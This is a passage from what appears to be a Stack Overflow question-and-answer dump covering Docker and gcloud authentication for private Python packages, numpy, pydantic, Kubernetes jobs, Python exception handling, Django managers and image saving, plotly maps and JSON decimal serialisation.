RUN --mount=type=secret,id=GOOGLE_APPLICATION_CREDENTIALS ${GOOGLE_APPLICATION_CREDENTIALS} gcloud auth activate-service-account --key-file=/run/secrets/GOOGLE_APPLICATION_CREDENTIALS
RUN gcloud auth list
RUN keyring --list-backends

WORKDIR /app

# copy Poetry project files and install dependencies
COPY ./.env* ./
COPY ./pyproject.toml ./poetry.lock* ./
RUN poetry install

# copy source files
COPY ./app /app/app

# run the program
CMD poetry run python -m app.main

</code></pre>
<p>As you can see, I injected the Google credentials file, <a href=""https://cloud.google.com/sdk/gcloud/reference/auth/activate-service-account"" rel=""noreferrer"">following this documentation</a>. This works. I used Docker BuildKit secrets, as exposed <a href=""https://docs.docker.com/develop/develop-images/build_enhancements/#new-docker-build-secret-information"" rel=""noreferrer"">here</a> (security concerns are not a matter of this question). So, when I try to build the image, I got an authentication error (<code>GOOGLE_APPLICATION_CREDENTIALS</code> is properly set pointing to a valid key file):</p>
<pre class=""lang-bash prettyprint-override""><code>$ DOCKER_BUILDKIT=1 docker image build --secret id=GOOGLE_APPLICATION_CREDENTIALS,src=${GOOGLE_APPLICATION_CREDENTIALS} -t app-test .

...
#19 66.68 &lt;c1&gt;Source (my-lib):&lt;/c1&gt; Authorization error accessing https://us-east4-python.pkg.dev/my-gcp-project/my-lib/simple/mylib/
#19 68.21
#19 68.21   RuntimeError
#19 68.21
#19 68.22   Unable to find installation candidates for mylib (0.1.1)
...
</code></pre>
<p>If I execute, line by line, all the commands in the Dockerfile, using the same Google credentials key file outside Docker, I got it working.</p>
<p>I even tried to debug inside the image, not executing <code>poetry install</code>, nor <code>poetry run...</code> commands, and I saw this, if it helps to debug:</p>
<pre class=""lang-bash prettyprint-override""><code># gcloud auth list
                  Credentialed Accounts
ACTIVE  ACCOUNT
*       &lt;my-account&gt;@appspot.gserviceaccount.com

</code></pre>
<pre class=""lang-bash prettyprint-override""><code># keyring --list-backends
keyrings.gauth.GooglePythonAuth (priority: 9)
keyring.backends.chainer.ChainerBackend (priority: -1)
keyring.backends.fail.Keyring (priority: 0)
</code></pre>
<p>Finally, I even tried following this approach: <a href=""https://github.com/jaraco/keyring/blob/main/README.rst#using-keyring-on-headless-linux-systems"" rel=""noreferrer"">Using Keyring on headless Linux systems in a Docker container</a>, with the same results:</p>
<pre class=""lang-bash prettyprint-override""><code># apt update
...
# apt install -y gnome-keyring
...
# dbus-run-session -- sh
GNOME_KEYRING_CONTROL=/root/.cache/keyring-MEY1T1
SSH_AUTH_SOCK=/root/.cache/keyring-MEY1T1/ssh
# poetry install
...
  • Installing mylib (0.1.1): Failed

  RuntimeError

  Unable to find installation candidates for mylib (0.1.1)

  at ~/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/installation/chooser.py:103 in choose_for
       99│
      100│             links.append(link)
      101│
      102│         if not links:
    → 103│             raise RuntimeError(f&quot;Unable to find installation candidates for {package}&quot;)
      104│
      105│         # Get the best link
      106│         chosen = max(links, key=lambda link: self._sort_key(package, link))
      107│
...

</code></pre>
<p>I even tried following the advices of <a href=""https://stackoverflow.com/questions/72528100/how-to-unlock-gnome-keyring-on-debian-headless-wsl-2-and-make-it-work-in-pytho"">this other question</a>. No success.</p>
<p><code>gcloud</code> CLI works inside the container, testing other commands. My guess is that the integration with Keyring is not working properly, but I don't know how to debug it.</p>
<p><strong>How can I get my dependency resolved inside a Docker container?</strong></p>
","75218763","<p>Finally, I found a solution that worked in my use case.</p>
<p>There are two main parts:</p>
<ol>
<li>Installing <a href=""https://pypi.org/project/keyrings.google-artifactregistry-auth/"" rel=""nofollow noreferrer"">keyrings.google-artifactregistry-auth</a> as <a href=""https://python-poetry.org/docs/master/plugins/#the-self-add-command"" rel=""nofollow noreferrer"">a Poetry plugin</a>, using this command:</li>
</ol>
<pre><code>poetry self add keyrings.google-artifactregistry-auth
</code></pre>
<ol start=""2"">
<li>Authenticating inside the container using a <a href=""https://cloud.google.com/iam/docs/creating-managing-service-account-keys"" rel=""nofollow noreferrer"">service account key file</a>:</li>
</ol>
<pre><code>gcloud auth activate-service-account --key-file=key.json
</code></pre>
<p>In my case, I use <a href=""https://docs.docker.com/engine/reference/commandline/buildx_build/#secret"" rel=""nofollow noreferrer"">BuildKit secrets</a> to handle it.</p>
<p>Then, for instance, the Dockerfile would like this:</p>
<pre><code>FROM python:3.9

# Install Poetry
RUN curl -sSL https://install.python-poetry.org | python3 -
ENV PATH &quot;${PATH}:/root/.local/bin&quot;

# install Google Artifact Registry tools for Python as a Poetry plugin
RUN poetry self add keyrings.google-artifactregistry-auth

# Install Google Cloud SDK CLI
ARG GCLOUD_VERSION=&quot;413.0.0-linux-x86_64&quot;
RUN wget -q https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-${GCLOUD_VERSION}.tar.gz &amp;&amp; \
    tar -xf google-cloud-cli-*.tar.gz &amp;&amp; \
    ./google-cloud-sdk/install.sh --quiet &amp;&amp; \
    rm google-cloud-cli-*.tar.gz
ENV PATH &quot;${PATH}:/google-cloud-sdk/bin&quot;

# authenticate with gcloud using a BuildKit secret
RUN --mount=type=secret,id=gac.json \
    gcloud auth activate-service-account --key-file=/run/secrets/gac.json

COPY ./pyproject.toml ./poetry.lock* /
RUN poetry install

# deauthenticate with gcloud once the dependencies are already installed to clean the image
RUN gcloud auth revoke --all

COPY ./app /app

WORKDIR /app

CMD [&quot;whatever&quot;, &quot;command&quot;, &quot;you&quot;, &quot;use&quot;]
</code></pre>
<p>And the Docker build command, providing the secret:</p>
<pre class=""lang-bash prettyprint-override""><code>DOCKER_BUILDKIT=1 docker image build \
        --secret id=gac.json,src=${GOOGLE_APPLICATION_CREDENTIALS} \
        -t ${YOUR_TAG} .
</code></pre>
<p>And with Docker Compose, a similar approach:</p>
<pre class=""lang-yaml prettyprint-override""><code>services:
  yourapp:
    build:
      context: .
      secrets:
        - key.json
    image: yourapp:yourtag
    ...
</code></pre>
<pre><code>COMPOSE_DOCKER_CLI_BUILD=1 DOCKER_BUILDKIT=1 docker compose up --build
</code></pre>
"
"73910005","1","How to sum an ndarray over ranges bounded by other indexes","<p>For an array of multiple dimensions, I would like to sum along some dimensions, with the sum range defined by other dimension indexes. Here is an example:</p>
<pre><code>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; x = np.arange(2*3*4).reshape((2,3,4))
&gt;&gt;&gt; x
array([[[ 0,  1,  2,  3],
        [ 4,  5,  6,  7],
        [ 8,  9, 10, 11]],

       [[12, 13, 14, 15],
        [16, 17, 18, 19],
        [20, 21, 22, 23]]])
&gt;&gt;&gt; wanted = [[sum(x[i,j,i:j]) for j in range(x.shape[1])] for i in range(x.shape[0])]
&gt;&gt;&gt; wanted
[[0, 4, 17], [0, 0, 21]]
</code></pre>
<p>Is there a more efficient way to do it without for loops or list comprehension? My array is quite large.</p>
","73910175","<p>You can use boolean masks:</p>
<pre><code># get lower triangles
m1 = np.arange(x.shape[1])[:,None]&gt;np.arange(x.shape[2])

# get columns index &gt;= depth index
m2 = np.arange(x.shape[2])&gt;=np.arange(x.shape[0])[:,None,None]

# combine both mask to form 3D mask
mask = m1 &amp; m2

out = np.where(mask, x, 0).sum(axis=2)
</code></pre>
<p>output:</p>
<pre><code>array([[ 0,  4, 17],
       [ 0,  0, 21]])
</code></pre>
<p>Masks:</p>
<pre><code># m1
array([[False, False, False, False],
       [ True, False, False, False],
       [ True,  True, False, False]])

# m2
array([[[ True,  True,  True,  True]],

       [[False,  True,  True,  True]]])

# mask
array([[[False, False, False, False],
        [ True, False, False, False],
        [ True,  True, False, False]],

       [[False, False, False, False],
        [False, False, False, False],
        [False,  True, False, False]]])
</code></pre>
"
"72087819","1","Pydantic set attribute/field to model dynamically","<p>According to the <a href=""https://pydantic-docs.helpmanual.io/usage/model_config/#options"" rel=""noreferrer"">docs</a>:</p>
<blockquote>
<p><strong>allow_mutation</strong></p>
<p>whether or not models are faux-immutable, i.e. whether <strong>setattr</strong> is allowed (default: True)</p>
</blockquote>
<p>Well I have a class :</p>
<pre class=""lang-py prettyprint-override""><code>class MyModel(BaseModel):

    field1:int

    class Config:
        allow_mutation = True
</code></pre>
<p>If I try to add a field dynamically :</p>
<pre class=""lang-py prettyprint-override""><code>model1 = MyModel(field1=1)
model1.field2 = 2
</code></pre>
<p>And I get this error :</p>
<pre><code>  File &quot;pydantic/main.py&quot;, line 347, in pydantic.main.BaseModel.__setattr__
ValueError: &quot;MyModel&quot; object has no field &quot;field2&quot;
</code></pre>
<p>Obviously, using <code>setattr</code> method will lead to the same error.</p>
<pre class=""lang-py prettyprint-override""><code>setattr(model1, 'field2', 2)
</code></pre>
<p>Output:</p>
<pre class=""lang-py prettyprint-override""><code>  File &quot;pydantic/main.py&quot;, line 347, in pydantic.main.BaseModel.__setattr__
ValueError: &quot;MyModel&quot; object has no field &quot;field2&quot;
</code></pre>
<p>What did I miss here ?</p>
","73373318","<p>You can use the Config object within the class and set the <code>extra</code> attribute to &quot;allow&quot; or use it as <code>extra=Extra.allow</code> kwargs when declaring the model</p>
<p>Example from the <a href=""https://pydantic-docs.helpmanual.io/usage/model_config/"" rel=""nofollow noreferrer"">docs</a> :</p>
<pre class=""lang-py prettyprint-override""><code>from pydantic import BaseModel, ValidationError, Extra


class Model(BaseModel, extra=Extra.forbid):
    a: str


try:
    Model(a='spam', b='oh no')
except ValidationError as e:
    print(e)
    &quot;&quot;&quot;
    1 validation error for Model
    b
      extra fields not permitted (type=value_error.extra)
    &quot;&quot;&quot;
</code></pre>
"
"73343529","1","Django google kubernetes client not running exe inside the job","<p>I have a docker image that I want to run inside my django code. Inside that image there is an executable that I have written using c++ that writes it's output to google cloud storage. Normally when I run the django code like this:</p>
<pre><code>container = client.V1Container(name=container_name, command=[&quot;//usr//bin//sleep&quot;], args=[&quot;3600&quot;], image=container_image, env=env_list, security_context=security)
</code></pre>
<p>And manually go inside the container to run this:</p>
<pre><code>gcloud container clusters get-credentials my-cluster --region us-central1 --project proj_name  &amp;&amp; kubectl exec pod-id -c jobcontainer -- xvfb-run -a &quot;path/to/exe&quot;
</code></pre>
<p>It works as intended and gives off the output to cloud storage. (I need to use a virtual monitor so I'm using xvfb first). However I must call this through django like this:</p>
<pre><code>container = client.V1Container(name=container_name, command=[&quot;xvfb-run&quot;], args=[&quot;-a&quot;,&quot;\&quot;path/to/exe\&quot;&quot;], image=container_image, env=env_list, security_context=security)
</code></pre>
<p>But when I do this, the job gets created but never finishes and does not give off an output to the storage. When I go inside my container to run <code>ps aux</code> I get this output:</p>
<pre><code>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2888  1836 ?        Ss   07:34   0:00 /bin/sh /usr/bin/xvfb-run -a &quot;path/to/exe&quot;
root          16  0.0  1.6 196196 66256 ?        S    07:34   0:00 Xvfb :99 -screen 0 1280x1024x24 -nolisten tcp -auth /tmp/xvfb-run.r5gaBO/Xauthority
root          35  0.0  0.0   7016  1552 ?        Rs   10:31   0:00 ps aux
</code></pre>
<p>It looks like it's stuck inside my code but my code does not have a loop that it can stuck inside, perhaps there is an error occurring (I don't think so since the exact same command is working when typed manually). If there is an error how can I see the console output? Why is my code get stuck and how can I get my desired output? Could there be an error caused by permissions (The code does a lot of stuff that requires permissions like writing to storage and reading files inside the pod, but like mentioned works normally when i run it via the command line)?</p>
","73404150","<p>Apparently for anyone having a similar issue, we fixed it by adding the command we want to run at the end of the <code>Dockerfile</code> instead of passing it as a parameter inside django's container call like this:</p>
<pre><code>cmd[&quot;entrypoint.sh&quot;]
</code></pre>
<p>entrypoint.sh:</p>
<pre><code>xvfb-run -a &quot;path/to/exe&quot;
</code></pre>
<p>Instead of calling it inside django like we did before and simply removing the command argument from the container call so it looked like this:</p>
<pre><code>container = client.V1Container(name=container_name, image=container_image, env=env_list, stdin=True, security_context=security)
</code></pre>
"
"73660050","1","How to achieve ""resumption semantics"" for Python exceptions?","<p>I have a validator class with a method that performs multiple checks and may raise different exceptions:</p>
<pre class=""lang-py prettyprint-override""><code>class Validator:
    def validate(something) -&gt; None:
        if a:
            raise ErrorA()
        if b:
            raise ErrorB()
        if c:
            raise ErrorC()
</code></pre>
<p>There's a place in the outside (caller) code where I want to customize its behaviour and prevent <code>ErrorB</code> from being raised, without preventing <code>ErrorC</code>. Something like <a href=""https://en.m.wikipedia.org/wiki/Exception_handling#Termination_and_resumption_semantics"" rel=""noreferrer"">resumption semantics</a> would be useful here. Hovewer, I haven't found a good way to achieve this.</p>
<p>To clarify: I have the control over <code>Validator</code> source code, but prefer to preserve its existing interface as much as possible.</p>
<p>Some possible solutions that I've considered:</p>
<ol>
<li><p>The obvious</p>
<pre class=""lang-py prettyprint-override""><code>try:
    validator.validate(something)
except ErrorB:
    ...
</code></pre>
<p>is no good because it also suppresses <code>ErrorC</code> in cases where both <code>ErrorB</code> and <code>ErrorC</code> should be raised.</p>
</li>
<li><p>Copy-paste the method and remove the check:</p>
<pre class=""lang-py prettyprint-override""><code># In the caller module

class CustomValidator(Validator):
    def validate(something) -&gt; None:
        if a:
            raise ErrorA()
        if c:
            raise ErrorC()
</code></pre>
<p>Duplicating the logic for <code>a</code> and <code>c</code> is a bad idea
and will lead to bugs if <code>Validator</code> changes.</p>
</li>
<li><p>Split the method into separate checks:</p>
<pre class=""lang-py prettyprint-override""><code>class Validator:
    def validate(something) -&gt; None:
        self.validate_a(something)
        self.validate_b(something)
        self.validate_c(something)

    def validate_a(something) -&gt; None:
        if a:
            raise ErrorA()

    def validate_b(something) -&gt; None:
        if b:
            raise ErrorB()

    def validate_c(something) -&gt; None:
        if c:
            raise ErrorC()

# In the caller module

class CustomValidator(Validator):
    def validate(something) -&gt; None:
        super().validate_a(something)
        super().validate_c(something)
</code></pre>
<p>This is just a slightly better copy-paste.
If some <code>validate_d()</code> is added later, we have a bug in <code>CustomValidator</code>.</p>
</li>
<li><p>Add some suppression logic by hand:</p>
<pre class=""lang-py prettyprint-override""><code>class Validator:
    def validate(something, *, suppress: list[Type[Exception]] = []) -&gt; None:
        if a:
            self._raise(ErrorA(), suppress)
        if b:
            self._raise(ErrorB(), suppress)
        if c:
            self._raise(ErrorC(), suppress)

    def _raise(self, e: Exception, suppress: list[Type[Exception]]) -&gt; None:
        with contextlib.suppress(*suppress):
            raise e
</code></pre>
<p>This is what I'm leaning towards at the moment.
There's a new optional parameter and the <code>raise</code> syntax becomes kinda ugly,
but this is an acceptable cost.</p>
</li>
<li><p>Add flags that disable some checks:</p>
<pre class=""lang-py prettyprint-override""><code>class Validator:
    def validate(something, *, check_a: bool = True,
                 check_b: bool = True, check_c: bool = True) -&gt; None:
        if check_a and a:
            raise ErrorA()
        if check_b and b:
            raise ErrorB()       
        if check_c and c:
            raise ErrorC()
</code></pre>
<p>This is good, because it allows to granually control different checks even
if they raise the same exception.</p>
<p>However, it feels verbose and will require additional maintainance
as <code>Validator</code> changes. I actually have more than three checks there.</p>
</li>
<li><p>Yield exceptions by value:</p>
<pre class=""lang-py prettyprint-override""><code>class Validator:
    def validate(something) -&gt; Iterator[Exception]:
        if a:
            yield ErrorA()
        if b:
            yield ErrorB()
        if c:
            yield ErrorC()
</code></pre>
<p>This is bad, because it's a breaking change for existing callers
and it makes propagating the exception (the typical use) way more verbose:</p>
<pre class=""lang-py prettyprint-override""><code># Instead of
# validator.validate(something)

e = next(validator.validate(something), None)
if e is not None:
    raise e
</code></pre>
<p>Even if we keep everything backwards-compatible</p>
<pre class=""lang-py prettyprint-override""><code>class Validator:
    def validate(something) -&gt; None:
        e = next(self.iter_errors(something), None)
        if e is not None:
            raise e

    def iter_errors(something) -&gt; Iterator[Exception]:
        if a:
            yield ErrorA()
        if b:
            yield ErrorB()
        if c:
            yield ErrorC()
</code></pre>
<p>The new suppressing caller still needs to write all this code:</p>
<pre class=""lang-py prettyprint-override""><code>exceptions = validator.iter_errors(something)
e = next(exceptions, None)
if isinstance(e, ErrorB):
    # Skip ErrorB, don't raise it.
    e = next(exceptions, None)
if e is not None:
    raise e
</code></pre>
<p>Compared to the previous two options:</p>
<pre class=""lang-py prettyprint-override""><code>validator.validate(something, suppress=[ErrorB])
</code></pre>
<pre class=""lang-py prettyprint-override""><code>validator.validate(something, check_b=False)
</code></pre>
</li>
</ol>
","73662557","<p>With bare exceptions you are looking at the wrong tool for the job. In Python, to <code>raise</code> an exception means that execution hits an <em>exceptional case</em> in which resuming <em>is not possible</em>. Terminating the broken execution is an express purpose of exceptions.</p>
<blockquote>
<h3><a href=""https://docs.python.org/3.10/reference/executionmodel.html#exceptions"" rel=""nofollow noreferrer"">Execution Model: 4.3. Exceptions</a></h3>
<p>Python uses the “termination” model of error handling: an exception handler can find out what happened and continue execution at an outer level, but it cannot repair the cause of the error and retry the failing operation (except by re-entering the offending piece of code from the top).</p>
</blockquote>
<p>To get resumption semantics for exception handling, you can look at the generic tools for either <em>resumption</em> or for <em>handling</em>.</p>
<hr />
<h3>Resumption: Coroutines</h3>
<p>Python's resumption model are <em>coroutines</em>: <code>yield</code> coroutine-generators or <code>async</code> coroutines both allow to pause and explicitly resume execution.</p>
<pre><code>def validate(something) -&gt; Iterator[Exception]:
    if a:
        yield ErrorA()
    if b:
        yield ErrorB()
    if c:
        yield ErrorC()
</code></pre>
<p>It is important to distinguish between <code>send</code>-style &quot;proper&quot; coroutines and iterator-style &quot;generator&quot; coroutines. As long as no value must be sent <em>into</em> the coroutine, it is functionally equivalent to an iterator. Python has good inbuilt support for working with iterators:</p>
<pre class=""lang-py prettyprint-override""><code>for e in validator.iter_errors(something):
    if isinstance(e, ErrorB):
        continue  # continue even if ErrorB happens
    raise e
</code></pre>
<p>Similarly, one could <code>filter</code> the iterator or use comprehensions. Iterators easily compose and gracefully terminate, making them suitable for iterating exception cases.</p>
<hr />
<h4>Effect Handling</h4>
<p>Exception handling is just the common use case for the more generic <em>effect handling</em>. While Python has no builtin effect handling support, simple handlers that address only the origin or sink of an effect can be modelled just as functions:</p>
<pre class=""lang-py prettyprint-override""><code>def default_handler(failure: BaseException):
    raise failure

def validate(something, failure_handler = default_handler) -&gt; None:
    if a:
        failure_handler(ErrorA())
    if b:
        failure_handler(ErrorB())
    if c:
        failure_handler(ErrorC())
</code></pre>
<p>This allows the caller to change the effect handling by supplying a different handler.</p>
<pre class=""lang-py prettyprint-override""><code>def ignore_b_handler(failure: BaseException):
    if not isinstance(failure, ErrorB):
        raise failure

validate(..., ignore_b_handler)
</code></pre>
<p>This might seem familiar to dependency inversion and is in fact related to it.</p>
<p>There are various stages of buying into effect handling, and it is possible to reproduce much if not all features via classes. Aside from technical functionality, one can implement ambient effect handlers (similar to how <code>try</code> &quot;connects&quot; to <code>raise</code> automatically) via <a href=""https://docs.python.org/3/library/threading.html#threading.local"" rel=""nofollow noreferrer"">thread local</a> or <a href=""https://docs.python.org/3/library/contextvars.html"" rel=""nofollow noreferrer"">context-local</a> variables.</p>
"
"73820642","1","Always Defer a Field in Django","<p>How do I make a field on a Django model deferred for all queries of that model without needing to put a defer on every query?</p>
<h1>Research</h1>
<p>This was <a href=""https://code.djangoproject.com/ticket/23816"" rel=""nofollow noreferrer"">requested as a feature in 2014 and rejected in 2022</a>.</p>
<p>Baring such a feature native to Django, the obvious idea is to make a custom manager like this:</p>
<pre><code>class DeferedFieldManager(models.Manager):

    def __init__(self, defered_fields=[]):
        super().__init__()
        self.defered_fields = defered_fields

    def get_queryset(self, *args, **kwargs):
        return super().get_queryset(*args, **kwargs
            ).defer(*self.defered_fields)

class B(models.Model):
    pass

class A(models.Model):
    big_field = models.TextField(null=True)
    b = models.ForeignKey(B, related_name=&quot;a_s&quot;)

    objects = DeferedFieldManager([&quot;big_field&quot;])

class C(models.Model):
    a = models.ForeignKey(A)

class D(models.Model):
    a = models.OneToOneField(A)

class E(models.Model):
    a_s = models.ManyToManyField(A)

</code></pre>
<p>However, while this works for <code>A.objects.first()</code> (direct lookups), it doesn't work for <code>B.objects.first().a_s.all()</code> (one-to-manys), <code>C.objects.first().a</code> (many-to-ones), <code>D.objects.first().a</code> (one-to-ones), or <code>E.objects.first().a_s.all()</code> (many-to-manys).</p>
<p>The thing I find particularly confusing here is that this is the default manager for my object, which means it should also be the default for the reverse lookups (the one-to-manys and many-to-manys), yet this isn't working.  Per the <a href=""https://docs.djangoproject.com/en/3.2/topics/db/queries/#using-a-custom-reverse-manager"" rel=""nofollow noreferrer"">Django docs</a>:</p>
<blockquote>
<p>By default the RelatedManager used for reverse relations is a subclass of the default manager for that model.</p>
</blockquote>
<p>An easy way to test this is to drop the field that should be deferred from the database, and the code will only error with an <code>OperationalError: no such column</code> if the field is not properly deferred.  To test, do the following steps:</p>
<ol>
<li>Data setup:
<pre><code>b = B.objects.create()
a = A.objects.create(b=b)
c = C.objects.create(a=a)
d = D.objects.create(a=a)
e = E.objects.create()
e.a_s.add(a)
</code></pre>
</li>
<li>Comment out <code>big_field</code></li>
<li><code>manage.py makemigrations</code></li>
<li><code>manage.py migrate</code></li>
<li>Comment in <code>big_field</code></li>
<li>Run tests:
<pre><code>from django.db import OperationalError
def test(test_name, f, attr=None):
    try:
        if attr:
            x = getattr(f(), attr)
        else:
            x = f()
        assert isinstance(x, A)
        print(f&quot;{test_name}:\tpass&quot;)
    except OperationalError:
        print(f&quot;{test_name}:\tFAIL!!!&quot;)

test(&quot;Direct Lookup&quot;, A.objects.first)
test(&quot;One-to-Many&quot;, B.objects.first().a_s.first)
test(&quot;Many-to-One&quot;, C.objects.first, &quot;a&quot;)
test(&quot;One-to-One&quot;, D.objects.first, &quot;a&quot;)
test(&quot;Many-to-Many&quot;, E.objects.first().a_s.first)
</code></pre>
</li>
</ol>
<p>If the tests above all pass, the field has been properly deferred.</p>
<p>I'm currently getting:</p>
<pre><code>Direct Lookup:  pass
One-to-Many:    FAIL!!!
Many-to-One:    FAIL!!!
One-to-One:     FAIL!!!
Many-to-Many:   FAIL!!!
</code></pre>
<h1>Partial Answer</h1>
<p><a href=""https://stackoverflow.com/a/73938166/2800876"">@aaron's answer</a> solves half of the failing cases.</p>
<p>If I change <code>A</code> to have:</p>
<pre><code>class Meta:
    base_manager_name = 'objects'
</code></pre>
<p>I now get the following from tests:</p>
<pre><code>Direct Lookup:  pass
One-to-Many:    FAIL!!!
Many-to-One:    pass
One-to-One:     pass
Many-to-Many:   FAIL!!!
</code></pre>
<p>This still does not work for the revere lookups.</p>
","73938166","<p>Set <code>Meta.base_manager_name</code> to <code>'objects'</code>.</p>
<pre class=""lang-py prettyprint-override""><code>class A(models.Model):
    big_field = models.TextField(null=True)
    b = models.ForeignKey(B, related_name=&quot;a_s&quot;)

    objects = DeferedFieldManager([&quot;big_field&quot;])

    class Meta:
        base_manager_name = 'objects'
</code></pre>
<p>From <a href=""https://docs.djangoproject.com/en/4.1/topics/db/managers/#using-managers-for-related-object-access"" rel=""nofollow noreferrer"">https://docs.djangoproject.com/en/4.1/topics/db/managers/#using-managers-for-related-object-access</a>:</p>
<blockquote>
<h4>Using managers for related object access</h4>
<p>By default, Django uses an instance of the <code>Model._base_manager</code> manager class when accessing related objects (i.e. <code>choice.question</code>), not the <code>_default_manager</code> on the related object. This is because Django needs to be able to retrieve the related object, even if it would otherwise be filtered out (and hence be inaccessible) by the default manager.</p>
<p>If the normal base manager class (<code>django.db.models.Manager</code>) isn’t appropriate for your circumstances, you can tell Django which class to use by setting <code>Meta.base_manager_name</code>.</p>
</blockquote>
<h1>Reverse Many-to-One and Many-to-Many managers</h1>
<p>The &quot;One-To-Many&quot; case in the question is a Reverse Many-To-One.</p>
<p>Django subclasses the manager class to override the behaviour, and then instantiates it — without the <code>defered_fields</code> argument passed to <code>__init__</code> since
<code>django.db.models.Manager</code> and its subclasses are not expected to have parameters.</p>
<p>Thus, you need something like:</p>
<pre class=""lang-py prettyprint-override""><code>def make_defered_field_manager(defered_fields):
    class DeferedFieldManager(models.Manager):
        def get_queryset(self, *args, **kwargs):
            return super().get_queryset(*args, **kwargs).defer(*defered_fields)
    return DeferedFieldManager()
</code></pre>
<p>Usage:</p>
<pre class=""lang-py prettyprint-override""><code># objects = DeferedFieldManager([&quot;big_field&quot;])
objects = make_defered_field_manager([&quot;big_field&quot;])
</code></pre>
"
"73668088","1","Can we use Plotly Express to plot zip codes?","<p>I'm using the code from this link.</p>
<p><a href=""https://devskrol.com/2021/12/27/choropleth-maps-using-python/"" rel=""nofollow noreferrer"">https://devskrol.com/2021/12/27/choropleth-maps-using-python/</a></p>
<p>Here's my actual code.</p>
<pre><code>import plotly.express as px
 
from urllib.request import urlopen
import json
with urlopen('https://raw.githubusercontent.com/plotly/datasets/master/geojson-counties-fips.json') as response:
    counties = json.load(response)
    
#import libraries
import pandas as pd
import plotly.express as px
 

fig = px.choropleth(df_mover, geojson=counties, 
                    locations='my_zip', 
                    locationmode=&quot;USA-states&quot;, 
                    color='switcher_flag',
                    range_color=(10000, 100000),
                    scope=&quot;usa&quot;
                    )
fig.update_layout(margin={&quot;r&quot;:0,&quot;t&quot;:0,&quot;l&quot;:0,&quot;b&quot;:0})
fig.show()
</code></pre>
<p>I'm simply trying to pass in data from my dataframe named df_movers, which has two fields: my_zip and switcher_flag. When I run this in a Jupyter notebook, it just runs and runs; it never stops. I'm only trying to plot 25 records, so it's not like there's too much data here. Finally, my_zip is data type object. Any idea what could be wrong here?</p>
","73669375","<p>Since you did not provide any user data, I tried your code with data including US zip codes from <a href=""https://simplemaps.com/data/us-zips"" rel=""nofollow noreferrer"">here</a>. I think the issue is that you don't need to specify the location mode. I specified county_fips for the location and population for the color fill.</p>
<pre><code>import plotly.express as px
from urllib.request import urlopen
import json
with urlopen('https://raw.githubusercontent.com/plotly/datasets/master/geojson-counties-fips.json') as response:
    counties = json.load(response)
    
#import libraries
import pandas as pd
us_zip = pd.read_csv('data/uszips.csv', dtype={'county_fips': str}) 

fig = px.choropleth(us_zip,
                    geojson=counties, 
                    locations='county_fips', 
                    #locationmode=&quot;USA-states&quot;, 
                    color='population',
                    range_color=(1000, 10000),
                    scope=&quot;usa&quot;
                    )
fig.update_layout(margin={&quot;r&quot;:0,&quot;t&quot;:0,&quot;l&quot;:0,&quot;b&quot;:0})
fig.show()
</code></pre>
<p><a href=""https://i.stack.imgur.com/RocyO.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RocyO.png"" alt=""enter image description here"" /></a></p>
"
"73070247","1","how to change image format when uploading image in django?","<p>When a user uploads an image from the Django admin panel, I want to change the image format to <strong>'.webp'</strong>. I have overridden the save method of the model. Webp file is generated in the media/banner folder but the generated file is not saved in the database. How can I achieve that?</p>
<pre><code>def save(self, *args, **kwargs):
    super(Banner, self).save(*args, **kwargs)
    im = Image.open(self.image.path).convert('RGB')
    name = 'Some File Name with .webp extention' 
    im.save(name, 'webp')
    self.image = im
</code></pre>
<p>But After saving the model, instance of the Image class not saved in the database?</p>
<p>My Model Class is :</p>
<pre><code>class Banner(models.Model):
    image = models.ImageField(upload_to='banner')
    device_size = models.CharField(max_length=20, choices=Banner_Device_Choice)
</code></pre>
","73430147","<pre><code>from django.core.files import ContentFile
</code></pre>
<p>If you already have the webp file, read the webp file, put it into the <code>ContentFile()</code> with a buffer (something like <code>io.BytesIO</code>). Then you can proceed to save the <code>ContentFile()</code> object to a model. Do not forget to update the model field, and save the model!</p>
<p><a href=""https://docs.djangoproject.com/en/4.1/ref/files/file/"" rel=""nofollow noreferrer"">https://docs.djangoproject.com/en/4.1/ref/files/file/</a></p>
<h3>Alternatively</h3>
<blockquote>
<p>&quot;django-webp-converter is a Django app which straightforwardly converts static images to WebP images, falling back to the original static image for unsupported browsers.&quot;</p>
</blockquote>
<p>It might have some save capabilities too.</p>
<p><a href=""https://django-webp-converter.readthedocs.io/en/latest/"" rel=""nofollow noreferrer"">https://django-webp-converter.readthedocs.io/en/latest/</a></p>
<h3>The cause</h3>
<p>You are also saving in the wrong order, the correct order to call the <code>super().save()</code> is at the end.</p>
<h5>Edited, and tested solution:</h5>
<pre><code>from django.core.files import ContentFile
from io import BytesIO

def save(self, *args, **kwargs):
    #if not self.pk: #Assuming you don't want to do this literally every time an object is saved.
    img_io = BytesIO()
    im = Image.open(self.image).convert('RGB')
    im.save(img_io, format='WEBP')
    name=&quot;this_is_my_webp_file.webp&quot;
    self.image = ContentFile(img_io.getvalue(), name)
    super(Banner, self).save(*args, **kwargs) #Not at start  anymore
    

    
</code></pre>
"
"74017216","1","Deserialize json string containing arbitrary-precision float numbers, and serialize it back","<p>Python has no built-in arbitrary-precision floats. Here is an example:</p>
<pre><code>&gt;&gt;&gt; float(4.4257052820783003)
4.4257052820783
</code></pre>
<p>So it doesn't matter what you use, you can't have a float object with arbitrary precision.</p>
<p>Let's say I have a <em>JSON string</em> (<code>json_string = '{&quot;abc&quot;: 4.4257052820783003}'</code>) containing an arbitrary-precision float. If I load that string, Python will cut the number:</p>
<pre><code>&gt;&gt;&gt; dct = json.loads(json_string)
&gt;&gt;&gt; dct
{'abc': 4.4257052820783}
</code></pre>
<p>I managed to avoid this loss of info by using <code>decimal.Decimal</code>:</p>
<pre><code>&gt;&gt;&gt; dct = json.loads(json_string, parse_float=Decimal)
&gt;&gt;&gt; dct
{'abc': Decimal('4.4257052820783003')}
</code></pre>
<p>Now, I would like to serialize this <code>dct</code> object to the original JSON formatted string. <code>json.dumps(dct)</code> clearly does not work (because objects of type Decimal are not JSON serializable). I tried to subclass <code>json.JSONEncoder</code> and redefine its <code>default</code> method:</p>
<pre><code>class MyJSONEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, Decimal):
            return str(o)
        return super().default(o)
</code></pre>
<p>But this is clearly creating a string instead of a number:</p>
